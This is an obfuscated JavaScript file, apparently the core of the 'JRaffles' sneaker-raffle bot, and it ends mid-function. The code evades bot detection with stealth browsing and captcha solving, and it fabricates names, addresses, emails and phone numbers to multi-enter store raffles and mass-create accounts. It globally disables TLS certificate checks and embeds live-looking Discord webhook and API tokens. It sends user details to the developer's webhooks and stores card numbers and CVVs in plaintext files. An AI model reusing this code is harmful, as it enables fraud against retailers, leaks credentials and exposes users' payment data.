process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x534d99 = require('fs'), _0x56df36 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x329dfe(_0x3f2c7d) {
    const _0x2d67e6 = _0x534d99['createWriteStream'](_0x3f2c7d, { 'flags': 'a' }), _0x2f096e = console['log'];
    console['log'] = function () {
        const _0x50d6a0 = Array['prototype']['slice']['call'](arguments), _0x180510 = _0x50d6a0['join']('\x20') + '\x0a';
        _0x2d67e6['write'](_0x180510), _0x2f096e['apply'](console, _0x50d6a0);
    };
}
_0x329dfe('../logs/log\x20' + _0x56df36);
var _0x29b6e6 = require('tough-cookie'), _0x48412a = require('node-imap'), _0xc8293 = require('util')['inspect'];
const _0x1560b8 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x14ebb9 } = require('discord.js');
var _0x19aebc = require('exe');
const { execFile: _0x267eac } = require('child_process'), _0x16ed0a = require('puppeteer-extra'), _0x1aeda3 = require('cross-spawn'), _0x3d4bba = require('puppeteer-extra-plugin-recaptcha'), _0x27f782 = require('puppeteer-extra-plugin-stealth'), _0x31f5da = require('chalk'), _0x4a5c1f = require('node-bash-title'), _0x8ae996 = require('axios'), _0x4d3f8b = require('papaparse');
var _0x1e5b69 = require('random-name');
const _0x33a47f = require('request');
var _0x402a5d = require('prompt');
const _0x149879 = _0x33a47f['jar']();
var _0x4558f2 = {};
const _0x40b7b4 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x557cfe = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x2d4d0b = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x5b221f = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x2db902 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x2be7d3 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x5ef34d = 'https://discord.com/api/webhooks/', _0x1ec515 = '' + _0x5ef34d + _0x2d4d0b, _0x46ec81 = '' + _0x5ef34d + _0x5b221f, _0x258e47 = '' + _0x5ef34d + _0x40b7b4, _0x5522d1 = '' + _0x5ef34d + _0x557cfe, _0x28ff05 = '' + _0x5ef34d + _0x2db902, _0x4abb13 = '' + _0x5ef34d + _0x2be7d3;
const _0x63105a = JSON['parse'](_0x534d99['readFileSync']('country.json', 'utf-8')), _0x19efd8 = JSON['parse'](_0x534d99['readFileSync']('../package.json', 'utf-8')), _0x2bc61f = _0x19efd8['version'];
var _0x231d1f, _0x124a40, _0x276431, _0x20e003, _0x15d43d, _0x1d3afc, _0xf4f7bc, _0x52f478;
const _0x20dfff = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x4be85a = ![];
const _0x349bda = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x31c7db = '0123456789';
var _0x3f4f8f = _0x349bda['split']('');
const _0x1da777 = require('auto-git-update'), _0x514551 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x6b42a = new _0x1da777(_0x514551);
async function _0x51cdc1() {
    _0x15d43d = _0x534d99['readdirSync']('../proxies'), _0x20e003 = _0x534d99['readdirSync']('../tasks'), !_0x534d99['existsSync']('../accounts/fenom.csv') && _0x534d99['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x534d99['existsSync']('../accounts/paypal.csv') && _0x534d99['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x534d99['existsSync']('../accounts/bstn.csv') && _0x534d99['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x534d99['existsSync']('../accounts/eql.csv') && _0x534d99['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x534d99['existsSync']('../failed-tasks.csv') && _0x534d99['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x534d99['existsSync']('../successful-tasks.csv') && _0x534d99['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x4558f2 = JSON['parse'](_0x534d99['readFileSync']('../settings.json', 'utf-8')), !_0x4558f2['delay'] && (_0x4558f2['delay'] = 0x3c, _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), !_0x4558f2['threads'] && (_0x4558f2['threads'] = 0x1, _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), !_0x4558f2['python'] && (_0x1aeda3('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20-r\x20modules/Confirmed/requirements.txt'
    ], { 'shell': !![] }), _0x1aeda3('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20git+https://github.com/66niko99/py-adyen-encrypt.git'
    ], { 'shell': !![] }), _0x4558f2['python'] = 'uptodate', _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), !_0x4558f2['masterMail'] && (_0x4558f2['masterMail'] = 'yourmail@gmail.com', _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), !_0x4558f2['CapSolver'] && (_0x4558f2['CapSolver'] = 'yourkeyhere', _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), !_0x4558f2['masterPassword'] && (_0x4558f2['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), !_0x4558f2['captchaKey'] && (_0x4558f2['captchaKey'] = '', _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), !_0x4558f2['useRandomProxy'] && (_0x4558f2['useRandomProxy'] = !![], _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), !_0x4558f2['shuffleTasks'] && (_0x4558f2['shuffleTasks'] = ![], _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), !_0x4558f2['webhook'] && (_0x4558f2['webhook'] = '', _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), _0x4558f2['delay'] <= 0x1388 && (_0x4558f2['delay'] = _0x4558f2['delay'] * 0x3e8), _0x4558f2['AfewDelay'] && (delete _0x4558f2['AfewDelay'], _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), _0x4558f2['MahaDelay'] && (delete _0x4558f2['MahaDelay'], _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), _0x4558f2['footshopDelay'] && (delete _0x4558f2['footshopDelay'], _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2, null, 0x2))), _0x4558f2['MahaDelay'] = _0x4558f2['delay'], _0x5ef34d = _0x4558f2['webhook'], _0x1d3afc = _0x4558f2['licenseKey'];
}
let _0x2a5402, _0x4ca121 = [], _0x40b7ff;
const _0x1e21d2 = _0x977cc7 => new Promise(_0x32360b => setTimeout(_0x32360b, _0x977cc7));
function _0x54ffea(_0x3446af, _0x1b2314) {
    return Math['floor'](Math['random']() * (_0x1b2314 - _0x3446af + 0x1) + _0x3446af);
}
function _0x362376(_0x491c9f) {
    let _0x4048c3 = _0x491c9f['length'], _0x166a0b;
    while (_0x4048c3 != 0x0) {
        _0x166a0b = Math['floor'](Math['random']() * _0x4048c3), _0x4048c3--, [_0x491c9f[_0x4048c3], _0x491c9f[_0x166a0b]] = [
            _0x491c9f[_0x166a0b],
            _0x491c9f[_0x4048c3]
        ];
    }
    return _0x491c9f;
}
async function _0x55cf7a(_0x320b81) {
    try {
        return _0x8ae996['post']('https://api.whop.com/api/v2/memberships/' + _0x320b81 + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x405ff0) {
        console['log']('Error\x20checking\x20license:\x20' + _0x405ff0['message']);
    }
}
async function _0x5625e8(_0x5474a6) {
    console['clear']();
    if (_0x5474a6 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x13fa78 = await _0x402a5d['get']('License');
        if (_0x13fa78['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x1e21d2(0xbb8), _0x5625e8(_0x5474a6);
        _0x5474a6 = _0x13fa78['License'], _0x4558f2['licenseKey'] = _0x5474a6, _0x1d3afc = _0x5474a6, _0x534d99['writeFileSync']('../settings.json', JSON['stringify'](_0x4558f2));
    }
    console['log']('Checking\x20license\x20' + _0x1d3afc + '...'), await _0x1e21d2(0x320);
    const _0x466152 = await _0x55cf7a(_0x5474a6);
    _0xf4f7bc = JSON['stringify'](_0x466152['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x52f478 = JSON['stringify'](_0x466152['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x466152)
        return console['log']('License\x20not\x20found');
    if (!_0x466152['data'])
        return console['log']('License\x20not\x20bound');
    return _0x466152['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x4be85a = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x4be85a = ![]);
}
async function _0x305934() {
    var _0x1436ca = await _0x402a5d['get']('Module');
    return console['clear'](), _0x1436ca['Module'];
}
;
async function _0x44ae7() {
    var _0x2f7ddf = await _0x402a5d['get']('Setting');
    return console['clear'](), _0x2f7ddf['Setting'];
}
async function _0x53a139(_0x1eea61) {
    var _0xcc2ee4 = [];
    for (file of _0x20e003) {
        var _0x4e777c = _0x534d99['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x4d3f8b['parse'](_0x4e777c, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x1eea61['store'] && _0xcc2ee4['push'](file);
    }
    !_0xcc2ee4['length'] == 0x0 && (_0x20e003 = _0xcc2ee4);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x2c65c5 = 0x0; _0x2c65c5 < _0x20e003['length']; _0x2c65c5++) {
        console['log']('\x20(' + _0x2c65c5 + ')\x20' + _0x20e003[_0x2c65c5]);
    }
    console['log']('');
    var _0x430164 = await _0x402a5d['get']('Task');
    if (_0x430164['Task'] > _0x20e003['length'] - 0x1 || isNaN(_0x430164['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1e21d2(0x3e8), _0x53a139();
    var _0x3b17f2 = _0x534d99['readFileSync']('../tasks/' + _0x20e003[_0x430164['Task']], 'utf-8');
    return _0x276431 = _0x4d3f8b['parse'](_0x3b17f2, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x31f5da['blue'](_0x20e003[_0x430164['Task']])), _0x231d1f = _0x20e003[_0x430164['Task']], _0x276431;
}
async function _0x534d08() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x2821da = 0x0; _0x2821da < _0x15d43d['length']; _0x2821da++) {
        console['log']('\x20(' + _0x2821da + ')\x20' + _0x15d43d[_0x2821da]);
    }
    console['log']('');
    var _0x21b217 = await _0x402a5d['get']('Proxies');
    if (_0x21b217['Proxies'] > _0x15d43d['length'] - 0x1 || isNaN(_0x21b217['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1e21d2(0x3e8), _0x534d08();
    var _0x2a93d6 = _0x534d99['readFileSync']('../proxies/' + _0x15d43d[_0x21b217['Proxies']], 'utf-8')['split']('\x0a');
    let _0x35ec87 = _0x2a93d6['map']((_0x4df9f1, _0x561fe4) => {
        sanatizeProxy = _0x4df9f1['replace']('\x0d', '');
        if (_0x2a93d6[_0x561fe4 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x124a40 = _0x15d43d[_0x21b217['Proxies']], console['clear'](), _0x35ec87;
}
async function _0x1c78dc() {
    var _0x2edfab = await _0x402a5d['get']('Value');
    return console['clear'](), _0x2edfab['Value'];
}
async function _0x713db(_0xd73dee) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x239b97 = 0x0; _0x239b97 < _0xd73dee['length']; _0x239b97++) {
        console['log']('\x20(' + _0x239b97 + ')\x20[' + _0xd73dee[_0x239b97]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x68ce32 = await _0x402a5d['get']('Module');
    return _0x68ce32['Module'];
}
async function _0x4b42dc() {
    var _0x5e0cfb = await _0x402a5d['get']('Password');
    return console['clear'](), _0x5e0cfb['Password'];
}
;
async function _0x3a95a3() {
    var _0x435e1b = await _0x402a5d['get']('Links');
    return _0x435e1b['Links'];
}
;
async function _0x1638e1() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x5c9825 = 0x0; _0x5c9825 < _0x4ca121['length']; _0x5c9825++) {
        console['log']('\x20(' + _0x5c9825 + ')\x20' + _0x4ca121[_0x5c9825]);
    }
    ;
    console['log']();
    let _0x3bb73b = await _0x402a5d['get']('Product');
    return console['clear'](), _0x3bb73b['Product'];
}
;
function _0x1a8584() {
    var _0x58d5ba = new Date(Date['now']())['toLocaleTimeString']();
    return _0x58d5ba;
}
;
function _0x442f0b() {
    var _0x53607e = new Date(Date['now']())['toLocaleString']();
    return _0x53607e['replace'](',', '');
}
async function _0xa0452b(_0x5127e0, _0x15597b) {
    let _0x4cbb11 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x2bc61f != 'devkey') {
        await _0x8ae996['post'](_0x5127e0, _0x15597b, _0x4cbb11);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x3d56af(_0xb2d549, _0x9350a5, _0x56a0a6, _0x14562d, _0x8ed374) {
    if (!_0x14562d && _0x56a0a6 == 'dev') {
        var _0x4e139a = new _0x14ebb9()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x9350a5['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x9350a5['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0xb2d549['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x4558f2['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0xf4f7bc,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0xb2d549['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0xb2d549['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x2bc61f,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x4e139a['data'];
    } else {
        if (_0x14562d && _0x56a0a6 == 'dev') {
            var _0x4e139a = new _0x14ebb9()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x9350a5['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0xf4f7bc,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x9350a5['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0xb2d549['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x4558f2['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x8ed374,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0xb2d549['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0xb2d549['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x2bc61f,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x4e139a['data'];
        } else {
            if (_0x56a0a6 == 'pub') {
                var _0x4e139a = new _0x14ebb9()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x9350a5['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x9350a5['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0xb2d549['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x4558f2['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0xb2d549['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x2bc61f,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x4e139a['data'];
            } else {
                if (_0x56a0a6 == 'acc' && !_0x14562d) {
                    var _0x4e139a = new _0x14ebb9()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x9350a5['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0xf4f7bc,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x9350a5['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x4558f2['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x2bc61f,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x4e139a['data'];
                } else {
                    if (_0x56a0a6 == 'acc' && _0x14562d) {
                        var _0x4e139a = new _0x14ebb9()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x9350a5['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0xf4f7bc,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x8ed374,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x9350a5['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x4558f2['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x2bc61f,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x4e139a['data'];
                    } else {
                        if (_0x56a0a6 == 'open') {
                            var _0x4e139a = new _0x14ebb9()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x52f478)['addFields']({
                                'name': 'User',
                                'value': '' + _0xf4f7bc,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x2bc61f,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x4e139a['data'];
                        } else {
                            if (!_0x14562d && _0x56a0a6 == 'ver') {
                                var _0x4e139a = new _0x14ebb9()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x9350a5['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0xf4f7bc,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x9350a5['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x4558f2['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x2bc61f,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x4e139a['data'];
                            } else {
                                if (_0x14562d && _0x56a0a6 == 'ver') {
                                    var _0x4e139a = new _0x14ebb9()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x9350a5['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0xf4f7bc,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x8ed374,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x9350a5['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x4558f2['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x2bc61f,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x4e139a['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x437e8(_0x2b743b, _0x4dbaf4) {
    var _0x28df62 = _0x2b743b[_0x4dbaf4]['Address1']['split'](''), _0x6120dd = _0x2b743b[_0x4dbaf4]['Address2']['split'](''), _0x212fe4 = _0x2b743b[_0x4dbaf4]['Email']['split']('@');
    for (var _0x33e965 = 0x0; _0x33e965 < _0x28df62['length']; _0x33e965++) {
        if (_0x28df62[_0x33e965] == 'X') {
            var _0x55f7e5 = Math['round'](Math['random']() * (_0x349bda['length'] - 0x1));
            _0x28df62[_0x33e965] = _0x3f4f8f[_0x55f7e5];
        }
    }
    ;
    for (var _0x33e965 = 0x0; _0x33e965 < _0x6120dd['length']; _0x33e965++) {
        if (_0x6120dd[_0x33e965] == 'X') {
            var _0x55f7e5 = Math['round'](Math['random']() * (_0x349bda['length'] - 0x1));
            _0x6120dd[_0x33e965] = _0x3f4f8f[_0x55f7e5];
        }
    }
    ;
    _0x2b743b[_0x4dbaf4]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x2b743b[_0x4dbaf4]['FirstName'] = _0x1e5b69['first']());
    _0x2b743b[_0x4dbaf4]['LastName']['toUpperCase']() == 'RANDOM' && (_0x2b743b[_0x4dbaf4]['LastName'] = _0x1e5b69['last']());
    _0x212fe4[0x0]['toUpperCase']() == 'RANDOM' ? _0x212fe4[0x0] = '' + _0x1e5b69['first']() + _0x1e5b69['last']() + _0x54ffea(0x1, 0x3e7) + '@' : _0x212fe4[0x0] = _0x212fe4[0x0] + '@';
    _0x2b743b[_0x4dbaf4]['Email'] = _0x212fe4['join'](''), _0x2b743b[_0x4dbaf4]['Address1'] = _0x28df62['join'](''), _0x2b743b[_0x4dbaf4]['Address2'] = _0x6120dd['join']('');
    _0x2b743b[_0x4dbaf4]['Phone'] == 'RANDOM' && (_0x2b743b[_0x4dbaf4]['Phone'] = '0' + _0x54ffea(0x5f5e100, 0x3b9ac9ff));
    if (_0x2b743b[_0x4dbaf4]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x19fba3 = _0x54ffea(0x1, 0x270f);
        _0x2b743b[_0x4dbaf4]['Follower'] = '' + _0x1e5b69['first']() + _0x1e5b69['last']() + _0x19fba3 + '\x20';
    }
    _0x2b743b[_0x4dbaf4]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x2b743b[_0x4dbaf4]['HouseNumber'] = _0x54ffea(0x1, 0xc8));
    if (_0x2b743b[_0x4dbaf4]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x3f84e4 = Math['round'](Math['random']() * (_0x349bda['length'] - 0x1)), _0x517fc3 = _0x3f4f8f[_0x3f84e4];
        _0x2b743b[_0x4dbaf4]['Address1'] = _0x1e5b69['last']() + 'straat', _0x2b743b[_0x4dbaf4]['Zip'] == '' && (_0x2b743b[_0x4dbaf4]['Postcode'] = _0x54ffea(0x3e8, 0x270f) + '\x20' + _0x517fc3 + _0x517fc3, _0x2b743b[_0x4dbaf4]['Zip'] = _0x2b743b[_0x4dbaf4]['Postcode']), _0x2b743b[_0x4dbaf4]['HouseNumber'] = '' + _0x54ffea(0x1, 0xc8);
    }
    return;
}
;
async function _0x456859(_0x5f4b5c, _0x3d411f) {
    _0x534d99['appendFileSync']('../failed-tasks.csv', _0x442f0b() + ',' + _0x3d411f['store'] + ',' + _0x3d411f['name'] + ',' + _0x5f4b5c['Url'] + ',' + _0x5f4b5c['Size'] + ',' + _0x5f4b5c['Follower'] + ',' + _0x5f4b5c['FirstName'] + ',' + _0x5f4b5c['LastName'] + ',' + _0x5f4b5c['Address1'] + ',' + _0x5f4b5c['Address2'] + ',' + _0x5f4b5c['HouseNumber'] + ',' + _0x5f4b5c['Zip'] + ',' + _0x5f4b5c['City'] + ',' + _0x5f4b5c['State'] + ',' + _0x5f4b5c['Country'] + ',' + _0x5f4b5c['Phone'] + ',' + _0x5f4b5c['Email'] + ',' + _0x5f4b5c['Password'] + ',' + _0x5f4b5c['PaymentMethod'] + ',' + _0x5f4b5c['CardType'] + ',' + _0x5f4b5c['NameOnCard'] + ',' + _0x5f4b5c['CardNumber'] + ',' + _0x5f4b5c['ExpiryDate'] + ',' + _0x5f4b5c['CVV'] + ',' + _0x5f4b5c['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x406375(_0x5e660c, _0x199a96) {
    _0x534d99['appendFileSync']('../successful-tasks.csv', _0x442f0b() + ',' + _0x199a96['store'] + ',' + _0x199a96['name'] + ',' + _0x5e660c['Url'] + ',' + _0x5e660c['Size'] + ',' + _0x5e660c['Follower'] + ',' + _0x5e660c['FirstName'] + ',' + _0x5e660c['LastName'] + ',' + _0x5e660c['Address1'] + ',' + _0x5e660c['Address2'] + ',' + _0x5e660c['HouseNumber'] + ',' + _0x5e660c['Zip'] + ',' + _0x5e660c['City'] + ',' + _0x5e660c['State'] + ',' + _0x5e660c['Country'] + ',' + _0x5e660c['Phone'] + ',' + _0x5e660c['Email'] + ',' + _0x5e660c['Password'] + ',' + _0x5e660c['PaymentMethod'] + ',' + _0x5e660c['CardType'] + ',' + _0x5e660c['NameOnCard'] + ',' + _0x5e660c['CardNumber'] + ',' + _0x5e660c['ExpiryDate'] + ',' + _0x5e660c['CVV'] + ',' + _0x5e660c['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x523612() {
    let _0x3fb597 = proxyFile['split']('\x0a'), _0x7b1dec = _0x3fb597['map']((_0x25143e, _0x34217a) => {
        sanatizeProxy = _0x25143e['replace']('\x0d', '');
        if (_0x3fb597[_0x34217a + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x7b1dec;
}
;
async function _0x20e2b9(_0x930264, _0x4c97e3) {
